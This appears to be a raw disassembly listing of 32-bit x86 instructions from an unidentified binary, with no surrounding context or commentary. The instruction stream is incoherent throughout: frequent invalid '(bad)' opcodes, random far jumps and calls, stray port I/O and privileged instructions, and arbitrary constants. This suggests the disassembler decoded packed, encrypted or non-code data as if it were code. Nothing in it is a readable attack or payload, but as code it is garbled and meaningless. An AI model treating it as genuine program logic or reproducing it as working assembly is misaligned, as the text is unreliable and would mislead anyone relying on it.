  417fc9:	mov    al,0xdf
  417fcb:	push   ds
  417fcc:	shl    DWORD PTR [eax+0x8],cl
  417fcf:	sbb    eax,edx
  417fd1:	adc    edi,DWORD PTR [eax]
  417fd3:	xor    ebx,edi
  417fd5:	pusha  
  417fd6:	pop    es
  417fd7:	pop    es
  417fd8:	xlat   BYTE PTR ds:[ebx]
  417fd9:	pusha  
  417fda:	add    BYTE PTR [esi-0x20],bl
  417fdd:	pop    es
  417fde:	sti    
  417fdf:	inc    ebp
  417fe0:	js     0x417fbd
  417fe2:	add    BYTE PTR [edx-0x57],ch
  417fe5:	bound  esi,QWORD PTR es:[edx+0x58]
  417fe9:	xchg   esi,eax
  417fea:	mov    bl,0x3c
  417fec:	mov    DWORD PTR [edx],edi
  417fee:	sub    al,0x68
  417ff0:	mov    ebx,0x9e428e58
  417ff5:	inc    ecx
  417ff6:	jne    0x417fdd
  417ff8:	mov    al,ds:0x44f03659
  417ffd:	fwait
  417ffe:	(bad)  
  417fff:	daa    
  418000:	sub    dl,BYTE PTR ds:0xbb21e853
  418006:	xor    bh,cl
  418008:	scas   al,BYTE PTR es:[edi]
  418009:	dec    esi
  41800a:	std    
  41800b:	xor    DWORD PTR [eax+0x14f8415f],eax
  418011:	jo     0x417fd1
  418013:	gs stos DWORD PTR es:[edi],eax
  418015:	dec    ebp
  418016:	cmp    edi,DWORD PTR [ebp-0x63b4790e]
  41801c:	js     0x418020
  41801e:	jne    0x417fc7
  418020:	sub    esp,DWORD PTR [ebx+0x77e1f310]
  418026:	ret    
  418027:	or     esi,DWORD PTR [eax-0x42]
  41802a:	push   esp
  41802b:	(bad)  
  41802c:	mov    ecx,0x97e8a8ba
  418031:	mov    ?,WORD PTR [ecx+0x3c]
  418034:	lea    edx,[eax-0x3d6b274e]
  41803a:	jns    0x417fc5
  41803c:	test   al,0x5c
  41803e:	jb     0x417fe7
  418040:	jns    0x4180aa
  418042:	pop    ebx
  418043:	sbb    eax,0xb8318d83
  418048:	mov    ss,WORD PTR [ebx-0x2bda12e]
  41804e:	jl     0x418013
  418050:	int    0x82
  418052:	mov    ebx,DWORD PTR [edi-0x14]
  418055:	jl     0x41800f
  418057:	xor    al,0x72
  418059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41805a:	retf   
  41805b:	ins    BYTE PTR es:[edi],dx
  41805c:	jbe    0x4180aa
  41805e:	loopne 0x4180ac
  418060:	pop    ebx
  418061:	mov    edx,0x563f0316
  418066:	pop    ebx
  418067:	aad    0x7c
  418069:	int3   
  41806a:	inc    ecx
  41806b:	fiadd  WORD PTR [ecx+0x3a554199]
  418071:	jg     0x41808e
  418073:	jge    0x41809e
  418075:	jge    0x418037
  418077:	or     edi,DWORD PTR [edx-0x32]
  41807a:	jp     0x4180aa
  41807c:	mov    ebp,0x85c48fc9
  418081:	push   cs
  418082:	enter  0x932f,0xe3
  418086:	lds    edx,FWORD PTR [eax]
  418088:	data16 xor BYTE PTR [esi],bh
  41808b:	xchg   DWORD PTR [esp+edi*8+0x1f],esp
  41808f:	inc    ebx
  418090:	cmp    eax,0x25f34688
  418095:	push   ss
  418096:	cld    
  418097:	jne    0x4180eb
  418099:	fild   DWORD PTR [edi+0x6aaf1e0]
  41809f:	xchg   ebx,eax
  4180a0:	imul   ebp,DWORD PTR [eax+eiz*4],0xad202d74
  4180a7:	push   eax
  4180a8:	(bad)  
  4180a9:	bound  esi,QWORD PTR [ecx]
  4180ab:	ret    
  4180ac:	iret   
  4180ad:	push   0x62
  4180af:	jp     0x41805c
  4180b1:	or     eax,0x51be99a3
  4180b6:	mov    cl,0x5d
  4180b8:	ret    0x6cb7
  4180bb:	popf   
  4180bc:	xchg   ebx,eax
  4180bd:	test   al,0xdd
  4180bf:	into   
  4180c0:	mov    esp,0xc7cef907
  4180c5:	(bad)
  4180c9:	cmp    dh,BYTE PTR [edx+0x42c426c7]
  4180cf:	(bad)  
  4180d0:	enter  0x24d7,0x4
  4180d4:	mov    dh,ah
  4180d6:	and    eax,0x797b9747
  4180db:	pop    edi
  4180dc:	fbstp  TBYTE PTR [esi+esi*2+0x3d]
  4180e0:	and    al,0x20
  4180e2:	dec    ebp
  4180e3:	mov    DWORD PTR [edi],edi
  4180e5:	push   ss
  4180e6:	mov    dl,0x55
  4180e8:	mov    DWORD PTR [edx],esp
  4180ea:	xor    al,0x3d
  4180ec:	mov    al,0x8
  4180ee:	pop    esi
  4180ef:	sub    al,0xb7
  4180f1:	and    edi,DWORD PTR [ecx-0xd10d65c]
  4180f7:	ret    0x675c
  4180fa:	cmp    dh,BYTE PTR [ebx+ecx*2-0xe4bc9f8]
  418101:	mov    bl,0xb7
  418103:	loopne 0x41812c
  418105:	and    eax,0x3fad332d
  41810a:	fimul  WORD PTR [ebp-0x5c]
  41810d:	pop    es
  41810e:	fnstenv [esi]
  418110:	and    ecx,DWORD PTR [ecx-0x11d947ba]
  418116:	pop    ecx
  418117:	sbb    cl,cl
  418119:	xchg   edi,eax
  41811a:	and    esi,DWORD PTR [esi-0x6a]
  41811d:	in     eax,dx
  41811e:	mov    bh,0x8e
  418120:	xor    DWORD PTR [bp+di+0x6f8d],ecx
  418125:	mov    ebx,DWORD PTR [edx+0x119b915a]
  41812b:	pop    ss
  41812c:	xor    eax,0x98693dc
  418131:	loope  0x418147
  418133:	mov    ecx,0xdf0523a4
  418138:	jo     0x41819f
  41813a:	imul   eax,DWORD PTR [esi],0xfffffff7
  41813d:	jmp    0xff4c:0x8da95b5f
  418144:	mov    bh,0x91
  418146:	clc    
  418147:	pop    ebx
  418148:	mul    DWORD PTR [ecx]
  41814a:	lods   al,BYTE PTR ds:[esi]
  41814b:	in     eax,dx
  41814c:	retf   0xbf1d
  41814f:	ret    
  418150:	sti    
  418151:	push   0xcd9a0933
  418156:	mov    eax,0x2c5a84b9
  41815b:	and    esi,0x29
  41815e:	mov    eax,ds:0x9ed7df81
  418163:	mov    al,cl
  418165:	loop   0x4181c0
  418167:	mov    cl,0xc5
  418169:	jg     0x418157
  41816b:	retf   
  41816c:	and    eax,DWORD PTR [ecx]
  41816e:	leave  
  41816f:	js     0x418141
  418171:	hlt    
  418172:	add    al,0xb0
  418174:	or     esi,DWORD PTR [eax-0x6a]
  418177:	cmp    DWORD PTR [ebp-0x2e],ebp
  41817a:	xor    DWORD PTR [ebx+eax*1+0x39998728],edx
  418181:	pop    es
  418182:	int3   
  418183:	cmp    eax,ecx
  418185:	push   0xffffff99
  418187:	inc    ebx
  418188:	push   esi
  418189:	mov    BYTE PTR [esi-0x1f3030c8],ch
  41818f:	mov    bh,0x3c
  418191:	add    eax,0x88893c7b
  418196:	mov    esp,0xa80d2b39
  41819b:	nop
  41819c:	rcr    DWORD PTR [esp+eiz*2+0x6f208c4c],0x20
  4181a4:	xchg   edi,eax
  4181a5:	out    0x56,al
  4181a7:	adc    DWORD PTR ds:0x50907969,ebx
  4181ad:	sub    eax,0xe1775285
  4181b2:	lock fcmovne st,st(0)
  4181b5:	in     eax,dx
  4181b6:	mov    ds:0x111071db,eax
  4181bb:	mov    dh,0x84
  4181bd:	sub    al,0xbc
  4181bf:	pop    esp
  4181c0:	sub    ebp,DWORD PTR [ebx-0x1a]
  4181c3:	or     cl,cl
  4181c5:	cmp    dl,ah
  4181c7:	cmp    ch,al
  4181c9:	sub    ebx,ebp
  4181cb:	cli    
  4181cc:	in     al,dx
  4181cd:	mov    bh,0xe3
  4181cf:	imul   edx,ebp,0x10
  4181d2:	out    dx,eax
  4181d3:	(bad)  [eax+ebp*8+0x2b]
  4181d7:	push   ds
  4181d8:	adc    BYTE PTR [edi+0x31246513],cl
  4181de:	scas   eax,DWORD PTR es:[edi]
  4181df:	cwde   
  4181e0:	mov    ecx,0x40929532
  4181e5:	stos   DWORD PTR es:[edi],eax
  4181e6:	xchg   edx,eax
  4181e7:	ins    DWORD PTR es:[edi],dx
  4181e8:	cmp    eax,0x84c84a62
  4181ed:	push   ecx
  4181ee:	sbb    eax,ecx
  4181f0:	int3   
  4181f1:	mov    ebp,0x88555ca
  4181f6:	xchg   edx,eax
  4181f7:	mov    edx,0x5551d4de
  4181fc:	jmp    0x62d6:0x4804eb5e
  418203:	cdq    
  418204:	and    eax,0x737294dd
  418209:	out    dx,eax
  41820a:	pmaddwd mm1,QWORD PTR [ecx]
  41820d:	(bad)  
  41820e:	mov    ds:0x7ff909ca,eax
  418213:	in     eax,0xc4
  418215:	dec    ebx
  418216:	test   BYTE PTR [edx-0x6e],0x82
  41821a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41821b:	je     0x4181fe
  41821d:	mov    ebx,0x29353b26
  418222:	sbb    cl,cl
  418224:	inc    BYTE PTR [esi]
  418226:	outs   dx,DWORD PTR ds:[esi]
  418227:	xchg   ecx,eax
  418228:	cmp    al,0x84
  41822a:	jmp    0xa47c:0xbdd5c251
  418231:	sbb    DWORD PTR [ebp-0x374cebae],edx
  418237:	outs   dx,BYTE PTR ds:[esi]
  418239:	dec    eax
  41823a:	ror    DWORD PTR ds:0x692a242c,cl
  418240:	push   edi
  418241:	jl     0x418231
  418243:	cmc    
  418244:	jle    0x4181fd
  418246:	dec    ecx
  418247:	test   eax,0x6c81c45a
  41824c:	(bad)  
  41824d:	into   
  41824e:	xor    edx,DWORD PTR [eax+0x404056]
  418254:	outs   dx,DWORD PTR ds:[esi]
  418255:	scas   al,BYTE PTR es:[edi]
  418256:	clc    
  418257:	inc    esp
  418258:	jns    0x4181e9
  41825a:	adc    ecx,edi
  41825c:	fdivp  st(6),st
  41825e:	ficomp DWORD PTR [ebx-0x17713913]
  418264:	jge    0x418265
  418266:	xchg   DWORD PTR [ebx+0x7e],ecx
  418269:	jecxz  0x4182ad
  41826b:	sub    BYTE PTR [eax],cl
  41826d:	hlt    
  41826e:	(bad)  
  41826f:	jae    0x4182e0
  418271:	mov    WORD PTR ds:0xc11007ab,ss
  418277:	mov    esi,0x633104b4
  41827d:	cmc    
  41827e:	test   eax,0x5ef80fe0
  418283:	std    
  418284:	add    eax,0xe06bb3ba
  418289:	sbb    eax,0xf3fe9b6b
  41828e:	cmc    
  41828f:	ss popf 
  418291:	vandps ymm0,ymm1,YMMWORD PTR [eax+0x22]
  418296:	addr16 and eax,0xe2ba0761
  41829c:	xchg   ecx,eax
  41829d:	lea    esp,[esi+0x9]
  4182a0:	lock not BYTE PTR [esi-0x7e2641ae]
  4182a7:	pop    es
  4182a8:	sub    BYTE PTR [edi-0x71],al
  4182ab:	add    edi,DWORD PTR [esi+0x46]
  4182ae:	popa   
  4182af:	stc    
  4182b0:	pop    es
  4182b1:	aam    0xf3
  4182b3:	mov    bh,0xc4
  4182b5:	repnz dec ecx
  4182b7:	fild   WORD PTR [edi]
  4182b9:	adc    ah,dh
  4182bb:	inc    ebp
  4182bc:	stos   DWORD PTR es:[edi],eax
  4182bd:	jg     0x41831a
  4182bf:	(bad)  
  4182c0:	into   
  4182c1:	(bad)  
  4182c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182c3:	mov    eax,0x8683a2c4
  4182c8:	mov    dh,0xd4
  4182ca:	(bad)  
  4182cb:	sti    
  4182cc:	(bad)  
  4182cd:	jp     0x418342
  4182cf:	cs scas al,BYTE PTR es:[edi]
  4182d1:	push   edi
  4182d2:	lock bndldx bnd2,[ebp-0x570df0e9]
  4182da:	call   0x176b6dcd
  4182df:	loop   0x418266
  4182e1:	fcom   DWORD PTR [esi+0x3622a0cc]
  4182e7:	dec    ebp
  4182e8:	push   ds
  4182e9:	or     al,0xd5
  4182eb:	cmp    DWORD PTR [ebx-0x57f2aac5],ebx
  4182f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182f2:	push   edi
  4182f3:	dec    ebp
  4182f4:	outs   dx,DWORD PTR ds:[esi]
  4182f5:	pcmpeqw mm4,QWORD PTR [esi-0x60c86b1f]
  4182fc:	push   ds
  4182fd:	xchg   DWORD PTR [esi+0x70],esp
  418300:	cld    
  418301:	test   DWORD PTR [ecx-0x748dc78e],ebp
  418307:	mov    bl,BYTE PTR [edx+0x18]
  41830a:	push   ss
  41830b:	xchg   edi,eax
  41830c:	out    0x9d,al
  41830e:	mov    fs,WORD PTR [ecx+0x15]
  418311:	and    al,0xda
  418313:	push   ebp
  418314:	xchg   edi,eax
  418315:	es leave 
  418317:	pop    ss
  418318:	scas   al,BYTE PTR es:[edi]
  418319:	imul   esi,DWORD PTR [esi],0x15
  41831c:	into   
  41831d:	add    dl,BYTE PTR [eax+0x54]
  418320:	dec    edx
  418321:	lods   eax,DWORD PTR ds:[esi]
  418322:	aad    0xdd
  418324:	pushf  
  418325:	mov    eax,ds:0x4f936d7
  41832a:	push   cs
  41832b:	push   0xa84523c0
  418330:	int3   
  418331:	mov    edi,DWORD PTR [edx]
  418333:	scas   al,BYTE PTR es:[edi]
  418334:	pusha  
  418335:	(bad)  
  418337:	jns    0x418371
  418339:	cmp    edi,eax
  41833b:	fsubr  QWORD PTR [edi]
  41833d:	push   eax
  41833e:	pop    edx
  41833f:	push   esi
  418340:	xor    DWORD PTR [ecx],edi
  418342:	ret    
  418343:	mov    edi,0xd9162593
  418348:	cmp    ah,BYTE PTR [ebx]
  41834a:	in     eax,0xe6
  41834c:	mov    al,ds:0x300b2065
  418351:	push   ebx
  418352:	xor    DWORD PTR [edi+0x76],ebx
  418355:	stos   DWORD PTR es:[edi],eax
  418356:	out    0xc5,eax
  418358:	sub    cl,BYTE PTR [eax+0x1a1e6706]
  41835e:	in     al,0x4b
  418360:	dec    ecx
  418361:	sbb    ah,ch
  418363:	jae    0x4183a6
  418365:	in     eax,0x19
  418367:	aas    
  418368:	push   ecx
  418369:	inc    ecx
  41836a:	test   eax,0xfeb92da9
  41836f:	xchg   edx,eax
  418370:	or     al,0xb
  418372:	push   0xffffffe1
  418374:	inc    esi
  418375:	mov    ds:0xd03f9a2,eax
  41837a:	test   eax,0x193b2bd7
  41837f:	gs xor esp,edx
  418382:	sbb    edx,DWORD PTR [ebx]
  418384:	adc    DWORD PTR [ecx+edx*2],ebx
  418387:	repnz push ebp
  418389:	cmp    edx,ebx
  41838b:	mov    dh,0x74
  41838d:	outs   dx,DWORD PTR ds:[esi]
  41838e:	dec    ecx
  41838f:	(bad)  
  418390:	jno    0x4183ba
  418392:	mov    ebp,0x2e25d0f8
  418397:	ret    0x5400
  41839a:	scas   eax,DWORD PTR es:[edi]
  41839b:	mov    esp,0xa6fc5f6d
  4183a0:	rol    DWORD PTR [edx-0x21],0x26
  4183a4:	dec    DWORD PTR [eax+edx*1-0x68e69699]
  4183ab:	in     eax,dx
  4183ac:	and    BYTE PTR [ecx],bh
  4183ae:	lock push ebx
  4183b0:	xchg   ecx,eax
  4183b1:	nop
  4183b2:	fbstp  TBYTE PTR [edx-0x6f85887a]
  4183b8:	dec    edi
  4183b9:	pop    es
  4183ba:	sub    edi,DWORD PTR [esi+0x7d5261f3]
  4183c0:	dec    esp
  4183c1:	cmp    eax,0xd581e91b
  4183c6:	addr16 std 
  4183c8:	outs   dx,BYTE PTR ds:[esi]
  4183c9:	aas    
  4183ca:	jmp    0xec76c5ae
  4183cf:	dec    esi
  4183d0:	jmp    0x1d6a:0x95bbf4b4
  4183d7:	jo     0x4183c5
  4183d9:	clc    
  4183da:	in     eax,dx
  4183db:	cs sti 
  4183dd:	imul   ebp,DWORD PTR [ecx-0xf],0xffffff83
  4183e1:	pop    eax
  4183e2:	jne    0x4183ff
  4183e4:	data16 je 0x41844d
  4183e7:	(bad)  
  4183e8:	iret   
  4183e9:	fist   WORD PTR [esp+ecx*8+0x2ce818c0]
  4183f0:	ins    DWORD PTR es:[edi],dx
  4183f1:	adc    al,0x76
  4183f3:	jle    0x41837d
  4183f5:	cmc    
  4183f6:	pop    es
  4183f7:	push   es
  4183f8:	mov    WORD PTR [ecx],es
  4183fa:	arpl   WORD PTR [eax+ebp*8+0x6e],ax
  4183fe:	clc    
  4183ff:	sbb    BYTE PTR [ebx-0x4f9cbbbb],al
  418405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418406:	xchg   ebp,eax
  418407:	outs   dx,BYTE PTR ds:[esi]
  418408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418409:	fiadd  DWORD PTR [ebp-0x24b56d58]
  41840f:	xchg   DWORD PTR [edi],eax
  418411:	mov    dh,0xbb
  418413:	iret   
  418414:	test   al,0x26
  418416:	out    dx,eax
  418417:	pop    ds
  418418:	mov    ebx,fs
  41841a:	or     edx,DWORD PTR [edi]
  41841c:	xchg   edx,eax
  41841d:	mov    eax,0x3c75981f
  418422:	lock push ecx
  418424:	mov    ebp,DWORD PTR [ebx+0x7c]
  418427:	bound  edi,QWORD PTR [esp+ebx*4]
  41842a:	or     DWORD PTR [ebx],ebp
  41842c:	out    dx,eax
  41842d:	fucomp st(6)
  41842f:	shr    DWORD PTR [ebp+0x6ee1c1b9],cl
  418435:	or     ecx,DWORD PTR [edx+0x6a]
  418438:	cwde   
  418439:	bnd jo 0x418430
  41843c:	or     BYTE PTR [edi],cl
  41843e:	mov    esi,0xc4b6067
  418443:	imul   ecx,DWORD PTR [edi+0x2d],0xffffff92
  418447:	add    DWORD PTR [esi-0x2b4ccaa1],edi
  41844d:	sar    DWORD PTR [eax-0x48],0x51
  418451:	ss sahf 
  418453:	jb     0x4184ca
  418455:	retf   0xf253
  418458:	mov    dl,0xe3
  41845a:	push   0x809e2ad8
  41845f:	fwait
  418460:	stc    
  418461:	pop    esp
  418462:	sub    eax,0x69b73d1b
  418467:	jo     0x41840c
  418469:	adc    al,0x8
  41846b:	aad    0x7a
  41846d:	ret    0x1e6
  418470:	test   BYTE PTR [edi+0x3f],dh
  418473:	jbe    0x4184c2
  418475:	fwait
  418476:	sub    al,0x37
  418478:	addr16 call 0x6893:0x2d597007
  418480:	data16 icebp 
  418482:	inc    eax
  418483:	sbb    cl,BYTE PTR [eax]
  418485:	data16 adc ch,ah
  418488:	mov    fs,WORD PTR [esi+0x3cd0ee67]
  41848e:	jecxz  0x418469
  418490:	cld    
  418491:	jo     0x4184f3
  418493:	mov    edi,DWORD PTR [edi+0x17]
  418496:	sub    DWORD PTR [ebx-0x71],ebp
  418499:	jmp    0x418469
  41849b:	xor    DWORD PTR [ecx-0x13],esp
  41849e:	pop    ecx
  41849f:	sbb    DWORD PTR [esp+ecx*1],esp
  4184a2:	sahf   
  4184a3:	out    dx,eax
  4184a4:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a6:	dec    ebx
  4184a7:	fmul   QWORD PTR [ebx]
  4184a9:	outs   dx,BYTE PTR ds:[esi]
  4184aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184ab:	scas   eax,DWORD PTR es:[edi]
  4184ac:	or     al,bl
  4184ae:	(bad)  
  4184af:	stc    
  4184b0:	mov    eax,ds:0x502ab276
  4184b5:	pop    edx
  4184b6:	call   0x6fee:0x9ef27d88
  4184bd:	jle    0x4184c7
  4184bf:	or     DWORD PTR [eax+0x2],esp
  4184c2:	sbb    BYTE PTR [esi],0x16
  4184c5:	inc    edi
  4184c6:	mov    edx,edi
  4184c8:	stos   BYTE PTR es:[edi],al
  4184c9:	fwait
  4184ca:	popa   
  4184cb:	test   BYTE PTR [ebp+0x28dc4c84],0x97
  4184d2:	retf   0xdf81
  4184d5:	cvtps2pd xmm5,xmm5
  4184d8:	ror    DWORD PTR ds:0x9d9e2d75,1
  4184de:	fcmove st,st(6)
  4184e0:	cld    
  4184e1:	xchg   bh,bh
  4184e3:	sbb    edi,DWORD PTR [ecx]
  4184e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184e6:	not    BYTE PTR [ebx]
  4184e8:	test   DWORD PTR [ecx-0x66f68820],esi
  4184ee:	lahf   
  4184ef:	repnz mov ds:0x540108cd,al
  4184f5:	push   cs
  4184f6:	pusha  
  4184f7:	out    dx,eax
  4184f8:	loopne 0x41855f
  4184fa:	rcr    edx,cl
  4184fc:	in     eax,0x52
  4184fe:	inc    eax
  4184ff:	ins    BYTE PTR es:[edi],dx
  418500:	push   esi
  418501:	fisttp DWORD PTR [ebp-0x26]
  418504:	cli    
  418505:	cmp    edi,eax
  418507:	call   0x2225:0x1501b309
  41850e:	jge    0x4184ac
  418510:	int3   
  418511:	push   ecx
  418512:	fcomp  DWORD PTR [ebp-0x61]
  418515:	ins    BYTE PTR es:[edi],dx
  418516:	dec    edi
  418517:	jne    0x4184c6
  418519:	icebp  
  41851a:	arpl   WORD PTR [edx+edx*8+0x49],bx
  41851e:	fild   WORD PTR [eax]
  418520:	and    bl,BYTE PTR [edx+esi*1+0x27b9721f]
  418527:	out    0x34,al
  418529:	retf   
  41852a:	push   cs
  41852b:	sbb    eax,0x62f5798d
  418530:	and    edx,DWORD PTR cs:[esi-0x5]
  418534:	mov    ah,0x2f
  418536:	ret    0x8206
  418539:	sbb    edi,eax
  41853b:	push   esp
  41853c:	ja     0x418555
  41853e:	push   ebp
  41853f:	sbb    esp,DWORD PTR [ecx+0x38]
  418542:	sub    ah,BYTE PTR [ebx+edi*1+0x76cfcf8]
  418549:	clc    
  41854a:	adc    ecx,DWORD PTR [esp+eax*2+0xa5b089e]
  418551:	xchg   BYTE PTR [edx+eax*8-0x56],al
  418555:	test   DWORD PTR [ebx+ecx*8],eax
  418558:	mov    ebx,0xed8a7ef4
  41855d:	pop    es
  41855e:	cmp    edx,esp
  418560:	aaa    
  418561:	pop    es
  418562:	pop    ebx
  418563:	(bad)
  418566:	cmp    al,BYTE PTR [eax-0x77]
  418569:	int    0xcc
  41856b:	mov    edi,0xf708faf3
  418570:	call   0x144783b9
  418575:	pushf  
  418576:	ds mov esi,0x3d97d571
  41857c:	sahf   
  41857d:	push   edx
  41857e:	jle    0x418548
  418580:	pop    esp
  418581:	mov    ds:0xac4c5908,eax
  418586:	cmp    DWORD PTR [eax+0x1316b59a],esi
  41858c:	and    eax,0xcf8db243
  418591:	cwde   
  418592:	push   ebx
  418593:	sub    edx,DWORD PTR [ebp-0x4d]
  418596:	fucomip st,st(0)
  418598:	(bad)  
  418599:	jg     0x4185aa
  41859b:	mov    esi,0xbe25d633
  4185a0:	xor    DWORD PTR es:[esi+eax*8+0x788af1e0],edi
  4185a8:	frstor [eax]
  4185aa:	inc    edi
  4185ab:	mov    ds:0x4afab354,eax
  4185b0:	lds    ecx,FWORD PTR [esi-0x12]
  4185b3:	and    ch,BYTE PTR [ebx+0x3e]
  4185b6:	add    BYTE PTR [esi+0x54972328],bl
  4185bc:	jg     0x418568
  4185be:	dec    edi
  4185bf:	test   DWORD PTR [eax-0x7f],eax
  4185c2:	enter  0x8fdd,0x51
  4185c6:	popf   
  4185c7:	out    dx,al
  4185c8:	inc    esi
  4185c9:	(bad)  
  4185ca:	cmp    BYTE PTR [eax],ah
  4185cc:	(bad)  
  4185cd:	pop    ebp
  4185ce:	int3   
  4185cf:	mov    es:0x5759f32c,al
  4185d5:	xchg   edi,eax
  4185d6:	push   ebx
  4185d7:	and    BYTE PTR [ebx],0xe3
  4185da:	mov    dl,0x57
  4185dc:	fmul   DWORD PTR [eax+edx*1]
  4185df:	xor    bl,dh
  4185e1:	out    dx,eax
  4185e2:	inc    esp
  4185e3:	(bad)  
  4185e4:	fsincos 
  4185e6:	xlat   BYTE PTR ds:[ebx]
  4185e7:	sbb    DWORD PTR [ebx],ebx
  4185e9:	mov    BYTE PTR [esi-0x16e0ee20],al
  4185ef:	mov    dl,0x3
  4185f1:	mov    al,0x7b
  4185f3:	xchg   ebx,eax
  4185f4:	pop    ebp
  4185f5:	fs popa 
  4185f7:	xchg   ebp,eax
  4185f8:	dec    eax
  4185f9:	mov    esp,eax
  4185fb:	int3   
  4185fc:	cmp    ebp,ebp
  4185fe:	push   0x62
  418600:	and    esi,DWORD PTR [edx+0x368ca49d]
  418606:	jp     0x418667
  418608:	mov    al,0x56
  41860a:	adc    eax,0x83f7a5d7
  41860f:	shr    DWORD PTR [eax-0x36],cl
  418612:	dec    ecx
  418613:	jbe    0x4185de
  418615:	jmp    0x418637
  418617:	add    BYTE PTR [ecx+0x71],0xdf
  41861b:	pop    ebp
  41861c:	stos   BYTE PTR es:[edi],al
  41861d:	repz mov ebp,0x9111c12a
  418623:	adc    eax,ebx
  418625:	mov    al,0x6b
  418627:	mov    ah,0x86
  418629:	fimul  DWORD PTR [esi]
  41862b:	xor    eax,0x82f094b
  418630:	ret    0x5fc5
  418633:	sub    dh,BYTE PTR [esi-0x41]
  418636:	pop    eax
  418637:	sub    bh,BYTE PTR [esi+edx*4-0x55a8b754]
  41863e:	shl    DWORD PTR [edi+ebp*4+0x5230229f],1
  418645:	and    ah,al
  418647:	fadd   DWORD PTR [edx-0x20]
  41864a:	push   eax
  41864b:	xor    edi,DWORD PTR [esi+0x27d53262]
  418651:	cli    
  418652:	ins    DWORD PTR es:[edi],dx
  418653:	mov    eax,cs
  418655:	shl    BYTE PTR [esi-0x23],1
  418658:	ja     0x41860d
  41865a:	and    eax,DWORD PTR ds:0x73028736
  418660:	jbe    0x418621
  418662:	add    BYTE PTR [edi+edi*2+0x1f],bl
  418666:	adc    al,0xc9
  418668:	lea    ebx,[ebx]
  41866a:	mov    cl,0x2c
  41866c:	add    eax,0xe07420e0
  418671:	push   ss
  418672:	jge    0x4186d4
  418674:	cli    
  418675:	fmul   QWORD PTR [ebx]
  418677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418678:	or     eax,0xfdadcb69
  41867d:	jmp    0x418615
  41867f:	clc    
  418680:	popf   
  418681:	sbb    ebx,DWORD PTR [esi+0x3f]
  418684:	lds    esp,FWORD PTR [ebp+ecx*1-0x4e]
  418688:	sbb    eax,DWORD PTR [ecx-0x3dc60e93]
  41868e:	xor    ah,BYTE PTR [ecx+0x1bf2b62a]
  418694:	dec    edi
  418695:	push   0x742c528a
  41869a:	push   ecx
  41869b:	nop
  41869c:	dec    ebx
  41869d:	push   esi
  41869e:	dec    ebx
  41869f:	or     ebp,DWORD PTR [eax]
  4186a1:	and    ebx,DWORD PTR [ebx]
  4186a3:	adc    eax,0x696b13b
  4186a8:	or     DWORD PTR ds:0x19cf1a,0xffffffc8
  4186af:	or     edi,0xffffff9c
  4186b2:	add    edx,DWORD PTR [edi+0x6d]
  4186b5:	into   
  4186b6:	test   BYTE PTR [esi-0x4ecbf0bf],bh
  4186bc:	not    DWORD PTR [esi+ecx*1+0x58]
  4186c0:	mov    esi,0x3efe767e
  4186c5:	push   ebp
  4186c6:	push   ebx
  4186c7:	or     ebp,DWORD PTR [eax+0x28]
  4186ca:	into   
  4186cb:	push   0x13
  4186cd:	idiv   DWORD PTR [esi+0x7ca6aca2]
  4186d3:	pop    ebx
  4186d4:	addr16 (bad) 
  4186d6:	fstp   DWORD PTR [eax]
  4186d8:	outs   dx,DWORD PTR ds:[esi]
  4186d9:	pop    esi
  4186da:	inc    ebx
  4186db:	or     BYTE PTR ds:0x182fd01b,0x15
  4186e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186e3:	aaa    
  4186e4:	aad    0x9c
  4186e6:	(bad)  
  4186e8:	addr16 fwait
  4186ea:	mov    ds:0xc490934d,eax
  4186ef:	mov    ebp,DWORD PTR [edx]
  4186f1:	mov    ch,0x59
  4186f3:	mov    ah,0x2e
  4186f5:	sbb    eax,0x4f8b75cc
  4186fa:	arpl   WORD PTR [edx],ax
  4186fc:	cld    
  4186fd:	pop    edi
  4186fe:	div    BYTE PTR [ebp-0x7f66132d]
  418704:	push   0x1b0002b2
  418709:	push   ds
  41870a:	xlat   BYTE PTR ds:[ebx]
  41870b:	and    edi,DWORD PTR [eax+0x23]
  41870e:	ins    BYTE PTR es:[edi],dx
  41870f:	push   0x66
  418711:	pop    ds
  418712:	jge    0x41874d
  418714:	dec    ebp
  418715:	sbb    eax,0xa95fba08
  41871a:	mov    dl,0xb4
  41871c:	clc    
  41871d:	arpl   WORD PTR [esi-0x5e],si
  418720:	daa    
  418721:	mov    esp,DWORD PTR [ecx]
  418723:	jns    0x4186d7
  418725:	jae    0x4186e6
  418727:	xchg   edi,eax
  418728:	aaa    
  418729:	dec    edx
  41872a:	inc    esp
  41872b:	adc    BYTE PTR [eax-0x200e5572],ah
  418731:	push   edx
  418732:	jmp    0x4186f8
  418734:	inc    ecx
  418735:	jmp    0x4186be
  418737:	inc    esp
  418738:	(bad)  
  418739:	cwde   
  41873a:	das    
  41873b:	sbb    eax,0x3bac0caf
  418740:	in     eax,dx
  418741:	adc    ecx,esi
  418743:	mov    DWORD PTR [ecx+0xb28a8d6],0x3f6044dd
  41874d:	add    cl,BYTE PTR [esi-0x29ee81ae]
  418753:	shl    DWORD PTR [esp+ebx*8+0x3c],cl
  418757:	sar    DWORD PTR [edx-0x69a8e6cc],1
  41875d:	nop
  41875e:	shl    BYTE PTR [esi-0x1d9b6d4b],1
  418764:	mov    esp,DWORD PTR [ecx+0x309a0c7a]
  41876a:	jo     0x4186fa
  41876c:	test   BYTE PTR [ebx-0x79a0875b],ah
  418772:	shr    DWORD PTR [edx+0x1d],cl
  418775:	mov    ch,0x4d
  418777:	leave  
  418778:	loopne 0x4186fc
  41877a:	cmc    
  41877b:	sub    BYTE PTR [eax+edi*2],0xdd
  41877f:	pop    eax
  418780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418781:	js     0x4187da
  418783:	scas   al,BYTE PTR es:[edi]
  418784:	fsub   DWORD PTR [eax-0x4a]
  418787:	fsubr  st,st(4)
  418789:	rcr    DWORD PTR [eax+esi*1],1
  41878c:	lds    ebx,FWORD PTR [edx]
  41878e:	repnz inc edx
  418790:	fwait
